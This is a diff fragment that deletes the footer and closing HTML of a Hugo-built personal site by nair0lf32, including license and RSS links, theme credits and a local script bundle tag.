-        <div class="footer__content">
-            <span>&copy; 2024</span>
-            <span><a href="http://localhost:1313/">nair0lf32</a></span>
-            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
-            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
-            
-        </div>
-    </div>
-    
-    
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
-        </div>
-    </div>
-    
-</footer>
-
-            
-        </div>
-
-        
-
-
-
-<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>
-
-
-
-    </body>
-</html>
